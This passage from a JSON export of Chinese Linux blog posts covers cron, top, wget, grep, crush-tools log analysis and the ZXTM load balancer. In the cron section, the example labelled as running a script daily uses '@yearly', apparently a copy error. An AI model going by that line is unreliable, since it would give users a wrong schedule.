</tbody></table>  <p><strong>4.在相隔时间后执行计划任务：</strong></p>  <p>一下表示每10分钟执行一次脚本：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">*/10 * * * * /home/dongwm/test.sh</td>     </tr>   </tbody></table>  <p><strong>5.某特定相隔时间的计划任务：</strong></p>  <p>以下表示每年的第一分钟执行脚本：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">@yearly /home/dongwm/test.sh</td>     </tr>   </tbody></table>  <p>以下代表每月执行一次脚本：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">@monthly /home/dongwm/test.sh</td>     </tr>   </tbody></table>  <p>以下代表每天执行一次脚本（例如清理日志）：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">@yearly /home/dongwm/test.sh</td>     </tr>   </tbody></table>  <p><strong>6.重启后执行计划任务：</strong></p>  <p>这个我挺喜欢的呵呵</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">@reboot /home/dongwm/test.sh</td>     </tr>   </tbody></table>  <p><strong>7.以秒为单位执行计划任务：</strong></p>  <p>以下表示每20秒执行一次：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">* * * * * sleep 20; /home/dongwm/test.sh</td>     </tr>   </tbody></table></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "18"
    }
  },
  {
    "id": 22,
    "title": "关于top命令的研究",
    "category": "linux基础",
    "tags": [
      "top"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Etop%E7%81%B5%E5%91%BD%E7%9A%84%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>1  根据一些参数将性能排序</strong></p>\n\n<p>使用-O选项进入选择菜单，选择相关字母即可根据参数排序：</p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>Current Sort Field:  K  for window 1:Def\nSelect sort field via field letter, type any other key to return</p>\n\n<p>a: PID        = Process Id                  y: WCHAN      = Sleeping in Function\nb: PPID       = Parent Process Pid          z: Flags      = Task Flags &lt;sched.h&gt;\nc: RUSER      = Real user name\nd: UID        = User Id                   Note1:\ne: USER       = User Name                   If a selected sort field can't be\nf: GROUP      = Group Name                  shown due to screen width or your\ng: TTY        = Controlling Tty             field order, the '&lt;' and '&gt;' keys\nh: PR         = Priority                    will be unavailable until a field\ni: NI         = Nice value                  within viewable range is chosen.\nj: P          = Last used cpu (SMP)\n* K: %CPU       = CPU usage                 Note2:\nl: TIME       = CPU Time                    Field sorting uses internal values,\nm: TIME+      = CPU Time, hundredths        not those in column display.  Thus,\nn: %MEM       = Memory usage (RES)          the TTY &amp; WCHAN fields will violate\no: VIRT       = Virtual Image (kb)          strict ASCII collating sequence.\np: SWAP       = Swapped size (kb)           (shame on you if WCHAN is chosen)\nq: RES        = Resident size (kb)\nr: CODE       = Code size (kb)\ns: DATA       = Data+Stack size (kb)\nt: SHR        = Shared Mem size (kb)\nu: nFLT       = Page Fault count\nv: nDRT       = Dirty Pages count\nw: S          = Process Status\nx: COMMAND    = Command name/line</p>\n\n<p>本例选择K，这样就会进行CPU占用率的排序：</p>\n\n<p>28520 okooo     15   0  268m  39m  22m S  4.0  0.2   0:01.31 httpd\ntop - 22:10:20 up 58 days,  8:34,  1 user,  load average: 3.22, 3.48, 3.76\nTasks: 192 total,   6 running, 185 sleeping,   0 stopped,   1 zombie\nCpu(s): 29.0%us,  3.2%sy,  0.0%ni, 65.1%id,  0.1%wa,  0.5%hi,  2.2%si,  0.0%st\nMem:  16433032k total,  7796168k used,  8636864k free,   625372k buffers\nSwap:        0k total,        0k used,        0k free,  3845252k cached</p>\n\n<p>PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND\n28536 dongwm     16   0  276m  57m  32m S 27.3  0.4   0:21.60 httpd\n32401 dongwm    16   0  238m  38m  18m S 18.0  0.2   0:00.70 httpd\n29848 dongwm    16   0  278m  55m  29m S 16.6  0.3   0:11.11 httpd\n27389 dongwm     15   0  279m  61m  33m R 16.0  0.4   0:25.40 httpd\n26694 dongwm     15   0  272m  54m  34m S 15.6  0.3   0:30.51 httpd\n26356 dongwm     16   0  280m  65m  37m S 13.0  0.4   0:31.55 httpd\n27445 dongwm     16   0  289m  70m  33m S 12.3  0.4   0:24.50 httpd\n29531 dongwm     16   0  281m  61m  31m S 12.0  0.4   0:12.74 httpd\n9418  dongwm     15   0  338m  91m  42m R 10.0  0.6   1:44.67 httpd    </pre>\n<strong>2  高亮显示：按z或者b：</strong></p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2011/01/image.png\"><img style=\"display: inline; border: 0px;\" title=\"image\" src=\"http://www.dongwm.com/wp-content/uploads/2011/01/image_thumb.png\" border=\"0\" alt=\"image\" width=\"420\" height=\"203\" /></a></p>\n\n<p><strong>3  改变刷新top命令的时间间隔（默认是3s）:</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">delay from 3.0 to: 5</pre></td>\n</tr>\n</tbody>\n</table>\n4  <strong>显示/隐藏进程的路径-按c键：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"408\">\n<tbody>\n<tr>\n<td width=\"406\" valign=\"top\"><pre class=\"sh_bash\">26371 dongwm     22   0 2444m 384m 8648 S  3.0  1.2   1:42.50 /opt/apps/java6/bin/java -Xms1024m -Xmx2048m -jar /home/okooo/apps/cepServer_zyq/EsperServer.jar ap\n28985 dongwm    15   0 13032 1468  812 R  0.7  0.0   0:00.11 top\n2068 ossec     15   0  8064 2736  724 S  0.3  0.0   0:13.53 /var/ossec/bin/ossec-analysisd   </pre></td>\n</tr>\n</tbody>\n</table>\n<strong>5  设定top查看性能次数-当刷新指定次数后自动退出：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">top -n 你想要的次数</pre></td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "22"
    }
  },
  {
    "id": 23,
    "title": "关于wget研究",
    "category": "linux基础",
    "tags": [
      "wget"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Ewget%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>什么是wget？</strong></p>\n\n<p>wget是一个很好的linux下的下载工具，支持递归下载，非交互下载等各种场景。</p>\n\n<p><strong>1 通常下载单个文件方式：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"517\">\n<tbody>\n<tr>\n<td width=\"515\" valign=\"top\"><pre class=\"sh_bash\">#wget http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>2  下载一个和下载地址文件名不同的文件：</strong></p>\n\n<p>默认wget会自动分隔最后一个斜线的后面作为文件名，正常模式下载：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"519\">\n<tbody>\n<tr>\n<td width=\"517\" valign=\"top\"><pre class=\"sh_bash\">#wget <a href=\"http://www.dongwm.com/test/download.php?src_id=02\">http://www.<span style=\"color: #555555;\">dongwm.com</span>/test/download.php?src_id=02</a></pre></td>\n</tr>\n</tbody>\n</table>\n下载后：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">#ls\ndownload_.php?src_id=02</pre></td>\n</tr>\n</tbody>\n</table>\n可以使用-O选项解决：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"500\">\n<tbody>\n<tr>\n<td width=\"498\" valign=\"top\"><pre class=\"sh_bash\">#wget –O test.zip <a href=\"http://www.dongwm.com/test/download.php?src_id=02\">http://www.<span style=\"color: #555555;\">dongwm.com</span>/test/download.php?src_id=02</a></pre></td>\n</tr>\n</tbody>\n</table>\n下载后：<!--more-->\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">#ls\ntest.zip</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>3  指定下载速度（本例限制下载速度为3k/秒）：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"521\">\n<tbody>\n<tr>\n<td width=\"519\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# wget --limit-rate=3k http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>4  断点续传</strong></p>\n\n<p>当因为某种原因中断了下载想继续下载使用-c选项：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"529\">\n<tbody>\n<tr>\n<td width=\"527\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# wget --limit-rate=3k <a href=\"http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz\">http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz</a>\n--2011-01-22 12:10:13--  <a href=\"http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz\">http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz</a>\n正在解析主机 denism.homeip.net... 69.12.216.47\nConnecting to denism.homeip.net|69.12.216.47|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：18215 (18K) [application/x-gzip]\nSaving to: `rsnapgraph-0.6.tar.gz'&nbsp;</td></tr></tbody></table></p>\n\n<p>16% [=======&gt;                                        ] 3,072       2.99K/s\n[root@server ~]# wget -c --limit-rate=3k <a href=\"http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz\">http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz</a>\n--2011-01-22 12:10:19--  <a href=\"http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz\">http://denism.homeip.net/software/rsnapgraph/rsnapgraph-0.6.tar.gz</a>\n正在解析主机 denism.homeip.net... 69.12.216.47\nConnecting to denism.homeip.net|69.12.216.47|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 206 Partial Content\n长度：18215 (18K), 12071 (12K) remaining [application/x-gzip]\nSaving to: `rsnapgraph-0.6.tar.gz'</p>\n\n<p>100%[++++++++++++++++===============================&gt;] 18,215      3.08K/s   in 3.8s</p>\n\n<p>2011-01-22 12:10:24 (3.08 KB/s) - `rsnapgraph-0.6.tar.gz' saved [18215/18215]</pre>\n\n\n\n<strong>5  后台下载</strong></p>\n\n<p>可能这是一个很大的文件，所以使用-b选项进行后台下载，但是可以查看日志看进度：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"536\">\n<tbody>\n<tr>\n<td width=\"534\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# wget -b <a href=\"http://mirrors.sohu.com/gentoo/releases/x86/current-iso/stage3-i686-20110111.tar.bz2\">http://mirrors.sohu.com/gentoo/releases/x86/current-iso/stage3-i686-20110111.tar.bz2</a>\n继续在后台运行，pid 为 21327。\n将把输出写入至“wget-log”。&nbsp;</td></tr></tbody></table></p>\n\n<p>[root@server ~]# tail -f wget-log\n12900K .......... .......... .......... .......... ..........  8%  459K 4m28s\n12950K .......... .......... .......... .......... ..........  9%  411K 4m28s\n13000K .......... .......... .......... .......... ..........  9%  502K 4m28s\n13050K .......... .......... .......... .......... ..........  9%  548K 4m28s\n13100K .......... .......... .......... .......... ..........  9%  566K 4m28s\n13150K .......... .......... .......... .......... ..........  9%  670K 4m27s\n13200K .......... .......... .......... .......... ..........  9%  698K 4m27s\n13250K .......... .......... .......... .......... ..........  9%  878K 4m26s</pre>\n\n\n\n<strong>6 当下载多个内容时，可以将这些地址放在一个文件中，然后下载这个文件：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\"># cat &gt; download-file-list.txt\nURL1\nURL2\nURL3\nURL4&nbsp;</td></tr></tbody></table></p>\n\n<p>#wget -i download-file-list.txt</pre>\n\n\n\n<strong>7 下载一个站点（这样就可</strong>以下载我的网站的，并刚在了当前目录的localhost子目录下）：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"478\">\n<tbody>\n<tr>\n<td width=\"476\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# wget --mirror -p --convert-links -P localhost www.dongwm.com</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>8 限制下载的类型（本例是不下载网站的gif图像文件）</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">#wget --reject=gif www.dongwm.com</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>9  记录下载日志，使用-o选项：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"495\">\n<tbody>\n<tr>\n<td width=\"493\" valign=\"top\"><pre class=\"sh_bash\"># wget -o /var/log/wget.log www.dongwm.com</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>10  仅下载某些类型的文件：</strong></p>\n\n<p>呵呵我最喜欢的选项：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[#wget -r -A.pdf mirrors.sohu.com/ebook</pre></td>\n</tr>\n</tbody>\n</table>\n你会发现 搜狐镜像的PDF文档都被你下载了^.^，而且：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">--2011-01-22 12:27:51-- <a href=\"http://mirrors.sohu.com/\">http://mirrors.sohu.com/</a>\nReusing existing connection to mirrors.sohu.com:80.\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：12456 (12K) [text/html]\nSaving to: `mirrors.sohu.com/index.html'&nbsp;</td></tr></tbody></table></p>\n\n<p>100%[===============================================&gt;] 12,456      --.-K/s   in 0.06s</p>\n\n<p>2011-01-22 12:27:51 (195 KB/s) - `mirrors.sohu.com/index.html' saved [12456/12456]</p>\n\n<p>正在删除 mirrors.sohu.com/index.html 因为它应该被指定了拒绝下载。</pre>\n\n\n\n其他类型的文件就不下载了…</p>\n\n<p>11  下载ftp协议的文件：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"460\">\n<tbody>\n<tr>\n<td width=\"458\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# wget --ftp-user=USERNAME --ftp-password=PASSWORD www.dongwm.com</pre></td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "22"
    }
  },
  {
    "id": 24,
    "title": "关于grep命令的研究",
    "category": "linux基础",
    "tags": [
      "grep"
    ],
    "url": "/archives/guanyugrepminglingdeyanjiu/",
    "content": "<p><strong>1 单文件搜索特定字符串</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm # grep \"dongwm\" /etc/passwd</p>\n\n<p>dongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash</p>\n\n<p></pre></p>\n\n<p><strong>2 多文件搜索特点字符串<!--more--></strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm # cp /etc/passwd /etc/passwd1</p>\n\n<p>linux-3qd1:/home/dongwm # grep \"dongwm\" /etc/passwd*</p>\n\n<p>/etc/passwd:dongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash</p>\n\n<p>/etc/passwd1:dongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash</pre></p>\n\n<p><strong>3 不区分大小写搜索字符串</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm #useradd DONGWM</p>\n\n<p>linux-3qd1:/home/dongwm # grep -i \"dongwm\" /etc/passwd</p>\n\n<p>dongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash</p>\n\n<p>DONGWM:x:1001:100::/home/DONGWM:/bin/bash</pre>\n<strong>4 支持正则表达式的搜索</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm # grep \"100.*wm\" /etc/passwd</p>\n\n<p>dongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash</p>\n\n<p>? 表示前面匹配一次或者零次</p>\n\n<p>* 表示前面匹配零次或者多次</p>\n\n<p>+ 表示前面匹配一次或者多次</p>\n\n<p>{n} 表示前面匹配n次</p>\n\n<p>{n,} 表示匹配n次或者更多</p>\n\n<p>{,m} 表示匹配最多m次</p>\n\n<p>{n,m} 表示匹配的次数是n-m次之间</pre></p>\n\n<p><strong>5 高亮显示匹配字符串：</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>export GREP_OPTIONS='--color=auto' GREP_COLOR='100;8'\n<img class=\"alignnone\" title=\"grep\" src=\"http://www.dongwm.com/wp-content/uploads/2011/01/sd.png\" alt=\"\" width=\"488\" height=\"80\" />\n</pre></p>\n\n<p><strong>6 对目录进行递归查询：</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm # grep \"dongwm\" /etc/ -r</p>\n\n<p>/etc/passwd:dongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash</p>\n\n<p>/etc/group:vboxusers:!:114:dongwm,root </pre></p>\n\n<p><strong>7 搜索不匹配字符串的条目：</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm # grep -v \"/bin/bash\" /etc/passwd</p>\n\n<p>avahi:x:106:109:User for Avahi:/var/run/avahi-daemon:/bin/false</p>\n\n<p>dnsmasq:x:103:65534:dnsmasq:/var/lib/empty:/bin/false</p>\n\n<p>haldaemon:x:105:107:User for haldaemon:/var/run/hald:/bin/false</pre></p>\n\n<p><strong>8 搜索不匹配多字符串的条目：</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm # grep -v -e \"/bin/bash\" -e \"avahi\" /etc/passwd</p>\n\n<p>dnsmasq:x:103:65534:dnsmasq:/var/lib/empty:/bin/false</p>\n\n<p>haldaemon:x:105:107:User for haldaemon:/var/run/hald:/bin/false </pre></p>\n\n<p><strong>9 计算匹配的行数：</strong></p>\n\n<p><pre class=\"sh_bash\"></p>\n\n<p>linux-3qd1:/home/dongwm # grep -c \"/bin/bash\" /etc/passwd</p>\n\n<p>14 </pre></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "23"
    }
  },
  {
    "id": 25,
    "title": "使用crush-tools分析apache访问日志",
    "category": "linux基础",
    "tags": [
      "crush-tools"
    ],
    "url": "/archives/ok/",
    "content": "<p><strong>crush（Custom Reporting Utilities for SHell）是用于处理数据的工具包，在这里我用来分析apache访问日志，它的网址是http://code.google.com/p/crush-tools/，我所要说的是其强大的性能和功能。</strong></p>\n\n<p><strong>1  下载安装：</strong></p>\n\n<p><pre class=\"sh_bash\"># wget http://crush-tools.googlecode.com/files/crush-tools-2010-03.tar.gz &amp;&amp; tar zxvf crush-tools-2010-03.tar.gz &amp;&amp; cd crush-tools-2010-03  &amp;&amp; ./configure --prefix=/opt/dongwm &amp;&amp; make &amp;&amp; make install</pre></p>\n\n<p>将其加入$PATH以便操作：</p>\n\n<p>#export PATH=$PATH:/opt/dongwm/bin</p>\n\n<p><strong>2  介绍本文使用到的工具包主要的命令：</strong></p>\n\n<p>aggregates 将分离数据集合，比如想知道某网页某段时间的访问量</p>\n\n<p>csvformat  将文件转换成csv格式</p>\n\n<p><tt>convdate  将数据转换日期格式，比如我们想按天统计</tt></p>\n\n<p>cutfield    当取得的数据有些不重要,可以使用此参数去掉那些列</p>\n\n<p><strong>3  设置：</strong></p>\n\n<p><strong>1  设置apache访问日志格式：</strong></p>\n\n<p>我使用默认的apache访问日志格式（httpd.conf中定义）：\n<pre class=\"sh_bash\">LogFormat \"%h %l %u %t \\\"%r\\\" %&gt;s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\" combined\nLogFormat \"%h %l %u %t \\\"%r\\\" %&gt;s %b\" common\nLogFormat \"%{Referer}i -&gt; %U\" referer\nLogFormat \"%{User-agent}i\" agent</pre>\n<strong>2  以下是perl脚本，用来格式化日志文件：</strong></p>\n\n<p><pre class=\"sh_bash\">[root@dongwm tmp]# cat  Format.pl\n#!/usr/bin/perl -w\nuse strict;\nif (! open LOGFILE,\"$ARGV[0]\"){\ndie \"logfile not exists!($!)\"\n}\nmy $output_delim = $ENV{DELIMITER} || chr(0xfe);\nmy $VirtualName=$ARGV[1];\n# (dropping the RFC 1413 identity field)\nprint join($output_delim,\nqw(IP 日期 时间 方式 页面 返回时间 平均处理时间)),qq(\\n);\nwhile (&lt;LOGFILE&gt;) {\nif (/((?:\\d{1,3})(?:\\.\\d{1,3}){3}|-)   # 1 IP\n(?:,.*)?\\s+(\\d+-\\d+-\\d+)\\s+       # 2 日期\n(\\d+:\\d+:\\d+)\\s+                   # 3 时\n(GET|POST)\\s+                     # 4 方法\n\"(.*?\\.php?)\\??.*\"\\s+             # 5 URL\n(\\d{3})\\s+                        # 6 返回码\n(\\d+.\\d+).*$/x                    # 7 处理时间\n)\n{\nprint join($output_delim, ($1,$2,$3,$4,$5,$6,$7,$VirtualName)),qq(\\n);\n}\n}\nexit(0);</pre></p>\n\n<p><strong>3 从ZXTM负载均衡设备上提取apache日志，我这里只一行用来说明：</strong></p>\n\n<p><pre class=\"sh_bash\">48.29.102.43 2011-03-15 00:00:22 GET \"/Lifeonline/NewIndex.php?MatchType=DWMet\" 200 0.025989 7860 \"http://www.dongwm.com/Test/DWMetIndex.php?ThisType=Lift\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; MDDC; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\"</p>\n\n<p>格式化后：</p>\n\n<p>#./Format.pl zxtm.log www|csvformat</p>\n\n<p>\"48.29.102.43\",\"2011-03-15\",\"00:00:22\",\"GET\",\"/Lifeonline/NewIndex.php\",\"200\",\"0.025989\",\"www\"</pre></p>\n\n<p>4 几种对网站内容性能测试体验：</p>\n\n<p><strong>1 查看用户访问各页面的数量：</strong></p>\n\n<p><pre class=\"sh_bash\"># ./Format.pl zxtm.log www|aggregate -k 5 -c 5 |csvformat  //其中-k 表示选择第五列作为key选择的主键，输出结果会显示此列，-c表示对第五列的主键进行统计次数，根据上面格式化后的信息可以知道，第五列也就是/Lifeonline/NewIndex.php，计算这个页面访问的次数</p>\n\n<p>输出如下：</p>\n\n<p>\"/Lifeonline/NewIndex.php\",\"7\"</pre></p>\n\n<p><strong>2 查看网站每页面响应时间最慢时间：</strong></p>\n\n<p><pre class=\"sh_bash\"># ./Format.pl zxtm.log www |aggregate -k 3,5 -x 7</p>\n\n<p>\"00:00:20\",\"/OKAdmin/index.php\",\"0.038450\"\n\"00:00:20\",\"/Remoting/gateway.php\",\"0.104104\"\n\"00:00:20\",\"/Remoting/json.php\",\"0.247292\"\n\"00:00:20\",\"/User/UserCenter.php\",\"0.492700\"\n\"00:00:20\",\"/WapAPI/v1.php\",\"0.297009\"</pre></p>\n\n<p><strong>3 查找页面影响最慢的页面:</strong></p>\n\n<p><pre class=\"sh_bash\"># ./Format.pl zxtm.log www|aggregate -p  -K 平均处理时间,页面|csvformat</p>\n\n<p>\"0.766413\",\"/Buy/UserBetList.php\"\n\"0.871648\",\"/Lottery06/SportterySoccer/SportteryTest.php\"\n\"1.021357\",\"/Lottery06/SportterySoccer/SportteryTest.php\"\n\"2.170618\",\"/Buy/UserBetList.php\"\n\"3.906909\",\"/Buy06/PassStat.php\"</p>\n\n<p>注:命令中-k -c -s等小学字母是以前的版本 新版支持大写+相对应的标签  这个命令 最初使用小写参数选项时候出现了一定的报错,但是使用大写参数就可以了,并且再去用小写也可以了,一个BUG</pre></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "February",
      "day": "21"
    }
  },
  {
    "id": 26,
    "title": "ZXTM专题一：介绍负载均衡器ZXTM LB",
    "category": "zxtm",
    "tags": [
      "ZXTM LB"
    ],
    "url": "/archives/zxtm%E4%B8%93%E9%A2%98%E4%B8%80%EF%BC%9A%E4%BB%8B%E7%BB%8D%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%99%A8zxtm-lb/",
    "content": "<p><strong>1 什么是ZXTM：</strong></p>\n\n<p>总是在说ZXTM，什么是ZXTM呢？其实它是Zeus Technology（官网www.zeus.com）的产品<a href=\"http://www.zeus.com/products/traffic-manager\"><strong>Zeus Traffic Manager</strong></a>以前的称呼，是一个基于J2EE运行，为一些网络服务（比如web server，邮件服务器等）应用提供复杂的负载均衡商业软件。</p>\n\n<p><strong>2  ZXTM和ZXTM LB：</strong></p>\n\n<p>其实ZXTM LB 就是为客户提供一个基础的负载均衡功能的解决方案，在ZXTM“cut”了一部分就成了ZXTM LB 呵呵，请看下图：</p>\n\n<p><strong>3  为什么要选择ZXTM LB<!--more-->（我这里以version5.0为例）</strong></p>\n\n<p><strong>1 可以创建一个完全容错的服务器集群</strong></p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2011/02/3.jpg\"><img style=\"display: inline; border: 0px;\" title=\"3\" src=\"http://www.dongwm.com/wp-content/uploads/2011/02/3_thumb.jpg\" border=\"0\" alt=\"3\" width=\"244\" height=\"215\" /></a></p>\n\n<p><strong>2 高效，可靠，可扩展</strong></p>\n\n<p>ZXTM LB有非常严格的对性能和健康检查和监控机制，以及集群诊断。通过不断监控您的后端服务器的运行状况，失败的服务器会自动检测并从集群中删除，直到他们康复，对于网络中很小的健康问题它都能提供报警使管理者提高警惕。它对高性能SSL和内容压缩，内容识别交通管理规则等支持非常好</p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2011/02/4.jpg\"><img style=\"display: inline; border: 0px;\" title=\"4\" src=\"http://www.dongwm.com/wp-content/uploads/2011/02/4_thumb.jpg\" border=\"0\" alt=\"4\" width=\"244\" height=\"128\" /></a></p>\n\n<p><strong>3  管理服务\n</strong>ZXTM LB接近服务器管理，使复杂的负载均衡决策，并密切监察托管服务。 它可以平衡UDP或任何基于TCP的协议，包括Web，DNS的，邮件（SMTP /IMAP / POP）的，FTP和流媒体DENG ,负载均衡决策最大限度地提高服务响应速度和防止任何一个应用程序或服务器节点成为超载。</p>\n\n<p><strong>4  帮助性能改进\n</strong>ZXTM LB能够大大提高应用程序的服务，通过流量优化和智能负载均衡性能。它可以让流量重定向使用内容感知路由策略服务器的特定设置，采取不同的应用功能并预留优质客户的能力。 ZXTM LB支持会话持久性方法，范围广</p>\n\n<p><strong>5  易于配置的GUI向导，以及RuleBuilderTM</strong></p>\n\n<p>图形用户界面RuleBuilder可以很容易创建负载平衡策略，以确定不同类型的流量和处理她们。\n<strong>6  Connection Draining </strong></p>\n\n<p>它的特殊的“Connection Draining ”功能可以让你安全地把一台服务器进行维修服务，而无需中断任何用户连接或会话。</p>\n\n<p><strong>7  流量可视化，趋势分析和完整系统的故障诊断\n</strong>ZXTM LB提供实时报告和灵活的查看某条件下的性能的历史趋势图。你以计划未来的能力要求，并且允许快速故障隔离，减少了时间来解决。统计数据收集的ZXTM LB，可以检索使用，易于集成到现有的网络基础设施的SNMP监控。</p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2011/02/5.jpg\"><img style=\"display: inline; border: 0px;\" title=\"5\" src=\"http://www.dongwm.com/wp-content/uploads/2011/02/5_thumb.jpg\" border=\"0\" alt=\"5\" width=\"227\" height=\"244\" /></a></p>\n\n<p><img class=\"alignnone\" title=\"zxtm\" src=\"http://knowledgehub.zeus.com/media/zxtm-zxtmlb.png\" alt=\"\" width=\"378\" height=\"596\" /></p>\n",
    "date": {
      "year": "2011",
      "month": "February",
      "day": "23"
    }
  },
  {
    "id": 27,
    "title": "查看和提取rpm，deb文件",
    "category": "linux基础",
    "tags": [
      "deb查看和提取",
      "rpm"
    ],
    "url": "/archives/%E6%9F%A5%E7%9C%8B%E5%92%8C%E6%8F%90%E5%8F%96rpm%EF%BC%8Cdeb%E6%96%87%E4%BB%B6/",
